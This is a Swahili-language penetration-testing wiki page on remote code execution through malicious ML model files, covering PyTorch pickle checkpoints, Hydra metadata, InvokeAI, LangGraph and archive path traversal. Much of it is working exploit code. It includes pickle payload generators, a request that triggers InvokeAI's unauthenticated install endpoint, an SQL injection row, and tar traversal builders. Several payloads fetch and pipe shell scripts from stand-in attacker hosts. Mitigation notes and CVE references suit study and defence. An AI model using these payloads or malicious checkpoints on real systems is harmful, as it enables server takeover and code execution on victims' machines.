# RCE ya Miundo

{{#include ../banners/hacktricks-training.md}}

## Kupakia modeli hadi RCE

Modeli za Machine Learning kwa kawaida hushirikishwa katika formats tofauti, kama vile ONNX, TensorFlow, PyTorch, n.k. Modeli hizi zinaweza kupakiwa kwenye mashine za developers au mifumo ya production ili zitumike. Kwa kawaida modeli hazipaswi kuwa na code hasidi, lakini kuna hali ambapo modeli inaweza kutumika kutekeleza code kiholela kwenye mfumo kama feature iliyokusudiwa au kutokana na vulnerability katika library ya kupakia modeli.

Jedwali lifuatalo linaorodhesha vulnerabilities wakilishi katika kundi hili:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Pickle hasidi katika model checkpoint husababisha code execution (ikikwepa ulinzi wa `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + upakuaji wa modeli hasidi husababisha code execution; Java deserialization RCE katika management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Checkpoint isiyoaminika huanzisha pickle reducer wakati wa `load_model_trainer_states_from_checkpoint` → code execution katika ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Key ya `filter` inayodhibitiwa na user huingiza syntax ya SQL/JSON-path, `UNION SELECT` hutengeneza fake checkpoint row, kisha `msgpack` deserialization hu-import na kuita Python code iliyochaguliwa na attacker | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Kupakia modeli kutoka YAML hutumia `yaml.unsafe_load` (code exec) <br> Kupakia modeli yenye layer ya **Lambda** huendesha Python code kiholela          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Modeli ya `.tflite` iliyoundwa mahsusi huanzisha integer overflow → heap corruption (uwezekano wa RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Kupakia modeli kupitia `joblib.load` huendesha pickle yenye payload ya `__reduce__` ya attacker                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` kwa default iliruhusu pickled object arrays – `.npy/.npz` hasidi huanzisha code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Path ya external-weights ya modeli ya ONNX inaweza kutoka nje ya directory (kusoma files kiholela) <br> Tar ya modeli ya ONNX hasidi inaweza ku-overwrite files kiholela (na kusababisha RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Modeli yenye custom operator huhitaji kupakia native code ya attacker; model graphs changamano hutumia vibaya logic ili kutekeleza computations zisizokusudiwa   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Kutumia model-load API huku `--model-control` ikiwa enabled huruhusu relative path traversal ya kuandika files (kwa mfano, ku-overwrite `.bashrc` kwa RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | GGUF model file iliyoharibiwa husababisha heap buffer overflows katika parser, na kuwezesha code execution kiholela kwenye mfumo wa victim                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Modeli hasidi ya HDF5 (`.h5`) yenye Lambda layer bado huendesha code wakati wa kupakiwa (Keras safe_mode haifanyi kazi kwenye format ya zamani – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | ML tools nyingi (kwa mfano, model formats zinazotumia pickle, `pickle.load` ya Python) zitatekeleza code kiholela iliyo embedded kwenye model files isipokuwa hatua za mitigation zitumike | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Model metadata/config inayodhibitiwa na attacker huweka `_target_` kuwa callable kiholela (kwa mfano, `builtins.exec`) → hutekelezwa wakati wa kupakia, hata ikiwa formats ni “safe” (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Zaidi ya hayo, kuna modeli za Python zinazotumia pickle, kama zile zinazotumiwa na [PyTorch](https://github.com/pytorch/pytorch/security), ambazo zinaweza kutumika kutekeleza code kiholela kwenye mfumo ikiwa hazitapakiwa kwa `weights_only=True`. Kwa hiyo, modeli yoyote inayotumia pickle inaweza kuwa susceptible hasa kwa aina hii ya attacks, hata kama haijaorodheshwa kwenye jedwali hapo juu.

### Hydra metadata → RCE (hufanya kazi hata na safetensors)

`hydra.utils.instantiate()` hu-import na kuita `_target_` yoyote iliyo dotted katika configuration/metadata object. Wakati libraries kama Hugging Face Transformers zinapopitisha **untrusted model metadata** kwenye `instantiate()`, attacker anaweza kutoa callable na arguments zinazoendeshwa mara moja wakati wa kupakia modeli (hakuna pickle inayohitajika).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Mfano wa payload (hufanya kazi katika `.nemo` `model_config.yaml`, repo `config.json`, au `__metadata__` ndani ya `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Mambo muhimu:
- Huanzishwa kabla ya uanzishaji wa model katika `restore_from/from_pretrained` ya NeMo, coders za uni2TS HuggingFace, na loaders za FlexTok.
- String block-list ya Hydra inaweza kuepukwa kupitia import paths mbadala (kwa mfano, `enum.bltns.eval`) au majina yanayotatuliwa na application (kwa mfano, `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok pia huchanganua metadata iliyobadilishwa kuwa string kwa `ast.literal_eval`, na hivyo kuwezesha DoS (ongezeko kubwa la matumizi ya CPU/memory) kabla ya mwito wa Hydra.

### 🆕 InvokeAI RCE kupitia `torch.load` (CVE-2024-12029)

`InvokeAI` ni web interface maarufu ya open-source kwa Stable-Diffusion. Versions **5.3.1 – 5.4.2** zinaweka wazi REST endpoint `/api/v2/models/install`, inayowaruhusu users kupakua na kupakia models kutoka URLs kiholela.<sup>[[1]](#references)</sup>

Kwa ndani, endpoint hatimaye huita:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wakati faili iliyotolewa ni **PyTorch checkpoint (`*.ckpt`)**, `torch.load` hufanya **pickle deserialization**. Kwa kuwa maudhui yanatoka moja kwa moja kwenye URL inayodhibitiwa na mtumiaji, mshambuliaji anaweza kuingiza object hasidi yenye method maalum ya `__reduce__` ndani ya checkpoint; method hiyo hutekelezwa **wakati wa deserialization**, na kusababisha **remote code execution (RCE)** kwenye server ya InvokeAI.

Athari hii ilipewa **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Mwongozo wa exploitation

1. Unda checkpoint hasidi:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Host `payload.ckpt` kwenye HTTP server unayoidhibiti (k.m. `http://ATTACKER/payload.ckpt`).
3. Trigger endpoint iliyo hatarini (hakuna authentication inayohitajika):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI inapopakua file hiyo, inaita `torch.load()` → gadget ya `os.system` inaendeshwa na mshambulizi anapata code execution katika context ya process ya InvokeAI.

Exploit iliyo tayari: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` ina-automate mtiririko mzima.<sup>[[3]](#references)</sup>

#### Masharti

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` inafikika na mshambulizi  
•  Process ina permissions za ku-execute shell commands

#### Mitigation

* Upgrade hadi **InvokeAI ≥ 5.4.3** – patch inaweka `scan=True` kwa default na hufanya malware scanning kabla ya deserialization.<sup>[[2]](#references)</sup>
* Unapopakia checkpoints programmatically, tumia `torch.load(file, weights_only=True)` au helper mpya [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Tekeleza allow-lists / signatures kwa model sources na endesha service kwa least-privilege.

> ⚠️ Kumbuka kwamba format yoyote inayotumia Python pickle (ikiwemo files nyingi za `.pt`, `.pkl`, `.ckpt`, `.pth`) kwa asili si salama ku-deserialize kutoka kwa sources zisizoaminika.

---

Mfano wa mitigation ya ad-hoc iwapo lazima uendelee kuendesha versions za zamani za InvokeAI nyuma ya reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE kupitia `torch.load` isiyo salama (CVE-2025-23298)

Transformers4Rec ya NVIDIA (sehemu ya Merlin) ilifichua checkpoint loader isiyo salama iliyokuwa ikiita moja kwa moja `torch.load()` kwenye paths zilizotolewa na mtumiaji. Kwa sababu `torch.load` hutegemea Python `pickle`, checkpoint inayodhibitiwa na mshambuliaji inaweza kutekeleza code kiholela kupitia reducer wakati wa deserialization.<sup>[[5]](#references)</sup>

Njia iliyo hatarini (kabla ya marekebisho): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Kwa nini hii husababisha RCE: Katika Python `pickle`, object inaweza kufafanua reducer (`__reduce__`/`__setstate__`) inayorejesha callable na arguments. Callable hiyo hutekelezwa wakati wa unpickling. Ikiwa object kama hiyo ipo kwenye checkpoint, itaendeshwa kabla ya weights yoyote kutumiwa.

Mfano mdogo wa checkpoint hasidi:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vektari za uwasilishaji na blast radius:
- Checkpoints/models zilizoambukizwa kwa Trojan zinazoshirikiwa kupitia repos, buckets, au artifact registries
- Pipelines za kiotomatiki za resume/deploy zinazopakia checkpoints kiotomatiki
- Utekelezaji hufanyika ndani ya training/inference workers, mara nyingi wakiwa na privileges zilizoinuliwa (mfano, root ndani ya containers)

Rekebisho: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ilibadilisha `torch.load()` ya moja kwa moja na deserializer yenye vizuizi na allow-list iliyotekelezwa katika `transformers4rec/utils/serialization.py`. Loader mpya huhakiki types/fields na huzuia arbitrary callables kuitwa wakati wa upakiaji.<sup>[[7]](#references)</sup>

Mwongozo wa ulinzi maalum kwa PyTorch checkpoints:
- Usifanye unpickle data isiyoaminika. Pendelea formats zisizotekelezeka kama [Safetensors](https://huggingface.co/docs/safetensors/index) au ONNX inapowezekana.
- Ikiwa ni lazima utumie PyTorch serialization, hakikisha `weights_only=True` (inatumika katika PyTorch mpya zaidi) au tumia allow-listed unpickler maalum inayofanana na Transformers4Rec patch.<sup>[[4]](#references)</sup>
- Tekeleza provenance/signatures za model na sandbox deserialization (seccomp/AppArmor; mtumiaji asiye root; FS yenye vikwazo na bila network egress).
- Fuatilia child processes zisizotarajiwa kutoka kwa ML services wakati wa kupakia checkpoint; fuatilia matumizi ya `torch.load()`/`pickle`.

POC na marejeleo ya vulnerable/patch:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Loader iliyo vulnerable kabla ya patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC ya malicious checkpoint: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader baada ya patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Mfano – kuunda malicious PyTorch model

- Unda model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Pakia modeli:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD inaweka wazi endpoint ya `resnet` inayofanya deserialization ya data inayodhibitiwa na mtumiaji. ZDI ilithibitisha kuwa mshambuliaji wa mbali anaweza kumshawishi mwathiriwa kupakia ukurasa/faili hasidi, kuifanya itume blob iliyotengenezwa kwa ustadi kwenda kwenye endpoint hiyo, na kuanzisha deserialization kama `root`, hali inayosababisha compromise kamili.

Mtiririko wa exploit unafanana na matumizi mabaya ya kawaida ya pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Kifaa chochote kinachoweza kufikiwa wakati wa deserialization (constructors, `__setstate__`, framework callbacks, n.k.) kinaweza kutumiwa vibaya kwa njia hiyo hiyo, bila kujali kama transport ilikuwa HTTP, WebSocket, au faili lililowekwa kwenye directory inayofuatiliwa.



### LangGraph checkpointer SQLi → MessagePack RCE

Mlolongo huu wa mashambulizi unavutia kwa sababu mshambuliaji **hahitajiki kupakia faili hasidi ya model**. Badala yake, application inaweka wazi **AI-agent persistence API** (`get_state_history(..., filter=...)`), na input ya mtumiaji inafikia query builder ya checkpointer.

#### 1. Structural SQLi katika metadata filters

Muundo wa SQLite ulio katika hatari ulionekana kama:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Thamani inawekwa baadaye, lakini `query_key` inaunganishwa kwenye **JSON path string**, hivyo `'` iliyo ndani ya dictionary key hutoka kwenye `'$.{query_key}'` na kuingiza SQL. Somo hilo hilo linatumika kwa **JSON paths, identifiers, operators, `LIMIT`, na TTL fields**: placeholders hulinda values pekee, si muundo wa query syntax.

#### 2. `UNION SELECT` inaweza kulenga downstream sinks, si wizi wa data pekee

Query inarudisha `type` na serialized `checkpoint` bytes, ambazo baadaye hutumiwa kama:
```python
self.serde.loads_typed((type, checkpoint))
```
Hiyo inamaanisha kuwa SQLi katika kifungu cha `WHERE` inaweza kuingiza **safu bandia ya matokeo**:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Ikiwa baadaye code itachanganua, itadeserialize, itaandika, au itatekeleza safu wima yoyote iliyochaguliwa, mapanga safu hizo na sinks zao. Katika hali hii, fake row inabadilisha SQLi kuwa **deserialization inayodhibitiwa na attacker**.

#### 3. Unsafe MessagePack extension hooks ni sawa na code gadgets

Njia ya `msgpack` ya LangGraph ilitumia extension hook maalum iliyofungua tuple iliyowekwa ndani na kutekeleza:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Kwa hivyo, MessagePack extension object inayosimba kitu sawa na `("os", "system", "id > /tmp/pwned")` huimport `os`, kutatua `system`, na kuendesha command. Wakati wa kukagua AI frameworks, chunguza **custom MessagePack/JSON/pickle revivers** kwa dynamic imports, reflection, au arbitrary callable dispatch.

#### 4. Muundo wa practical audit kwa agent frameworks

Kagua input yoyote inayodhibitiwa na mtumiaji inayofikia:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders zinazozalisha SQL au Redis query fragments
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths zinazoamini rows zilizorejeshwa kutoka persistence layer

Chain hii mahususi iliathiri deployments za self-hosted LangGraph zinazotumia **SQLite** au **Redis** checkpointers pale watumiaji wasioaminika walipoweza kudhibiti `filter`. Matoleo yaliyopatched yaliyoainishwa kwenye disclosure yalikuwa `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, na `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Models hadi Path Traversal

Kama ilivyoelezwa kwenye [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), miundo mingi ya models inayotumiwa na AI frameworks tofauti inategemea archives, kwa kawaida `.zip`. Kwa hivyo, huenda ikawezekana kutumia vibaya miundo hii kufanya path traversal attacks, na hivyo kuruhusu kusoma files zozote kutoka kwenye mfumo ambao model imepakuliwa.<sup>[[16]](#references)</sup>

Kwa mfano, kwa kutumia code ifuatayo unaweza kuunda model itakayounda file kwenye directory ya `/tmp` inapopakiwa:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Au, kwa kutumia code ifuatayo unaweza kuunda model ambayo itatengeneza symlink kwenda kwenye directory ya `/tmp` inapopakiwa:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Uchambuzi wa kina: Uondoaji wa mfululizo wa Keras .keras na uwindaji wa gadgets

Kwa mwongozo unaolenga vipengele vya ndani vya .keras, Lambda-layer RCE, suala la arbitrary import katika matoleo ≤ 3.8, na ugunduzi wa gadgets baada ya marekebisho ndani ya allowlist, tazama:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog – "CVE-2024-12029 – Uondoaji wa mfululizo wa data isiyoaminika katika InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – masuala ya usalama ya torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298: Kupata Remote Code Execution katika NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution kwa kutumia miundo na libraries za kisasa za AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Nyaraka za Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list commit (onyo kuhusu RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Kutoka SQLi hadi RCE: Kutumia vibaya Checkpointer ya LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Kugeuza kasoro za Archive Slip kuwa fursa zenye thamani kubwa za AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
{{#include ../banners/hacktricks-training.md}}
